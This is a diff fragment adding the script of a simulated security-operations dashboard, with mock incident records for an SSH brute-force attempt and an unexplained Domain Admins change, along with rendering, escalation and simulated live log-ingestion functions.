+     evidence:['Linux auth.log: 347 "Failed password" from 185.234.218.48 in 4 minutes','Usernames attempted: root, admin, ubuntu, www-data, jsmith, mysql','IP 185.234.218.48 on AbuseIPDB with 98% confidence: brute force scanner','No successful authentication recorded'],
+     timeline:[
+       {time:'23:41',txt:'First SSH connection attempt: root from 185.234.218.48',kind:'alert'},
+       {time:'23:42',txt:'Rate accelerates: 85 attempts per minute',kind:'alert'},
+       {time:'23:44',txt:'Threshold alert fired: >10 failures in 60s from single IP',kind:'neutral'},
+       {time:'23:45',txt:'Automatic block rule applied by IPS (if configured)',kind:'neutral'},
+     ],mitre:'T1110.001 — Brute Force: Password Guessing'},
+    {id:4,sev:'HIGH',title:'Admin Group Membership Changed — Domain Admins',status:'investigating',
+     rule:'EventID 4732 — Privileged Group Changed',host:'SRV-DC-01',time:ts(45),analyst:'SOC-L2-01',
+     desc:'User account svc_backup_temp was added to the Domain Admins group on SRV-DC-01. This account was created 2 hours earlier by rzhan outside of the documented provisioning process.',
+     evidence:['EventID 4732 — svc_backup_temp added to Domain Admins by rzhan','EventID 4720 — svc_backup_temp created at 01:12 by rzhan — no change ticket','IT department confirms: no account provisioning request exists','Account has no documented owner or business justification'],
+     timeline:[
+       {time:'01:12',txt:'svc_backup_temp user account created by rzhan (EventID 4720)',kind:'alert'},
+       {time:'01:14',txt:'Account password set and account enabled',kind:'neutral'},
+       {time:'03:22',txt:'svc_backup_temp added to Domain Admins group (EventID 4732)',kind:'alert'},
+       {time:'03:22',txt:'SIEM alert: privileged group membership change — P1 incident created',kind:'neutral'},
+     ],mitre:'T1098 — Account Manipulation'},
+  ];
+}
+
+let activeIncident=null;
+
+function renderIncidents(){
+  const list=document.getElementById('incident-list');
+  list.innerHTML='';
+  INCIDENTS.forEach(inc=>{
+    const div=document.createElement('div');
+    div.className='inc-item'+(selectedIncId===inc.id?' selected':'');
+    div.addEventListener('click',()=>{selectedIncId=inc.id;activeIncident=inc;renderIncidents();showIncidentDetail(inc);});
+    const sevColor={CRITICAL:'var(--red)',HIGH:'var(--orange)',MEDIUM:'var(--yellow)'}[inc.sev]||'var(--dim)';
+    const statusColor={open:'var(--red)',investigating:'var(--yellow)',closed:'var(--green)'}[inc.status]||'var(--dim)';
+    div.innerHTML=`<div class="inc-header">
+      <span class="inc-sev lsev-${e(inc.sev)}" style="font-size:9px">${e(inc.sev)}</span>
+      <span class="inc-title">${e(inc.title)}</span>
+    </div>
+    <div class="inc-meta">
+      <span class="inc-rule">${e(inc.rule)}</span>
+      <span style="color:${statusColor}">${e(inc.status.toUpperCase())}</span>
+      <span>${e(inc.time.slice(11))}</span>
+    </div>`;
+    list.appendChild(div);
+  });
+  document.getElementById('inc-total-badge').textContent=INCIDENTS.filter(i=>i.status==='open').length+' open';
+}
+
+function showIncidentDetail(inc){
+  document.getElementById('inc-detail-title').textContent='INC-'+inc.id+' — '+inc.title;
+  const sevColor={CRITICAL:'var(--red)',HIGH:'var(--orange)',MEDIUM:'var(--yellow)'}[inc.sev]||'var(--dim)';
+  const tlHtml=inc.timeline.map((t,i)=>`
+    <div class="it-item ${t.kind==='alert'?'alert-step':''}">
+      <span class="it-time">${e(t.time)}</span>
+      <span class="it-text">${e(t.txt)}</span>
+    </div>`).join('');
+  const evHtml=inc.evidence.map(ev=>`<div style="font-size:11px;padding:4px 0;border-bottom:1px solid rgba(45,55,72,.4);color:var(--dim2)">&#8227; ${e(ev)}</div>`).join('');
+  document.getElementById('inc-detail-area').innerHTML=`
+    <div style="display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap">
+      <span style="font-size:12px;padding:3px 10px;border-radius:4px;background:${sevColor}18;color:${sevColor};border:1px solid ${sevColor}40;font-weight:700">${e(inc.sev)}</span>
+      <span style="font-size:12px;padding:3px 10px;border-radius:4px;background:rgba(168,85,247,.1);color:var(--purple)">${e(inc.mitre)}</span>
+      <span style="font-size:11px;color:var(--dim2)">Host: <strong style="color:var(--cyan)">${e(inc.host)}</strong></span>
+      <span style="font-size:11px;color:var(--dim2)">Analyst: <strong>${e(inc.analyst)}</strong></span>
+    </div>
+    <div style="font-size:12px;line-height:1.7;color:var(--text);margin-bottom:14px">${e(inc.desc)}</div>
+    <div style="font-size:10px;text-transform:uppercase;letter-spacing:1px;color:var(--dim);margin-bottom:6px">Evidence</div>
+    <div style="background:var(--bg);border:1px solid var(--border);border-radius:5px;padding:10px;margin-bottom:12px">${evHtml}</div>
+    <div style="font-size:10px;text-transform:uppercase;letter-spacing:1px;color:var(--dim);margin-bottom:6px">Timeline</div>
+    <div class="inc-timeline">${tlHtml}</div>`;
+}
+
+function escalateInc(){
+  if(!activeIncident) return;
+  activeIncident.status='investigating';
+  activeIncident.analyst='SOC-L2-01';
+  renderIncidents();
+  showIncidentDetail(activeIncident);
+}
+
+function closeInc(){
+  if(!activeIncident) return;
+  activeIncident.status='closed';
+  renderIncidents();
+  renderDashboard();
+}
+
+// ── ALERTS PAGE ───────────────────────────────────────────────────────────────
+function renderAlerts(){
+  const criticals=ALL_LOGS.filter(l=>l.sev==='CRITICAL'||l.sev==='HIGH').slice(0,25);
+  const el=document.getElementById('alerts-list');
+  el.innerHTML='';
+  criticals.forEach(log=>{
+    const div=document.createElement('div');
+    div.style.cssText='background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:12px;margin-bottom:10px;cursor:pointer;transition:border-color .2s;';
+    div.addEventListener('mouseover',()=>div.style.borderColor='var(--accent)');
+    div.addEventListener('mouseout',()=>div.style.borderColor='var(--border)');
+    div.addEventListener('click',()=>{switchPage('logviewer',null);setTimeout(()=>showLogDetail(log.id),100);});
+    const sevColor={CRITICAL:'var(--red)',HIGH:'var(--orange)'}[log.sev]||'var(--yellow)';
+    div.innerHTML=`<div style="display:flex;align-items:flex-start;gap:10px">
+      <span class="log-sev lsev-${e(log.sev)}">${e(log.sev)}</span>
+      <div style="flex:1">
+        <div style="font-size:13px;font-weight:600;margin-bottom:4px;color:${sevColor}">${e(getCategory(log.eid))}</div>
+        <div style="font-size:12px;color:var(--text);margin-bottom:6px">${e(log.msg)}</div>
+        <div style="display:flex;gap:14px;font-size:11px;color:var(--dim2)">
+          <span>&#128196; ${e(log.source)}</span>
+          <span>&#128187; ${e(log.host)}</span>
+          <span>&#128336; ${e(log.ts)}</span>
+          <span style="color:var(--purple)">EventID: ${e(log.eid)}</span>
+        </div>
+      </div>
+      <button class="tbar-btn" style="flex-shrink:0" onclick="event.stopPropagation();alert('Alert acknowledged — assigned to queue')">Acknowledge</button>
+    </div>`;
+    el.appendChild(div);
+  });
+}
+
+// ── LIVE UPDATES ──────────────────────────────────────────────────────────────
+function addEvent(){
+  const log=generateLog();
+  ALL_LOGS.unshift(log);
+  updateCounters(log);
+  renderDashboard();
+  renderLogTable();
+}
+
+function refreshData(){
+  for(let i=0;i<rnd(1,4);i++){
+    const log=generateLog();
+    ALL_LOGS.unshift(log);
+    updateCounters(log);
+  }
+  renderDashboard();
+  renderLogTable();
+  renderAlerts();
+}
+
+function exportLogs(){
+  alert('Logs exported to: soc-siem-export-'+new Date().toISOString().slice(0,10)+'.csv\n'+counters.total+' events written.');
+}
+
+function globalSearch(){
+  const q=document.getElementById('global-search').value;
+  if(q.length>1){
+    document.getElementById('log-filter').value=q;
+    switchPage('logviewer',null);
+    filterLogs();
+  }
+}
+
+// ── INIT ─────────────────────────────────────────────────────────────────────
+window.onload=function(){
+  seedData();
+  renderDashboard();
+  buildLogSourceSidebar();
+  renderLogTable();
+  renderLogSources();
+  renderEventIds();
+  renderIncidents();
+  renderAlerts();
+  // Live ingestion simulation
+  setInterval(()=>{
+    if(Math.random()<0.6){
+      const log=generateLog();
+      ALL_LOGS.unshift(log);
+      if(ALL_LOGS.length>300) ALL_LOGS.pop();
+      updateCounters(log);
+      renderDashboard();
+      if(document.getElementById('page-logviewer').classList.contains('active')) renderLogTable();
+    }
+  }, 3500);
+};
+</script>
+</body>
+</html>
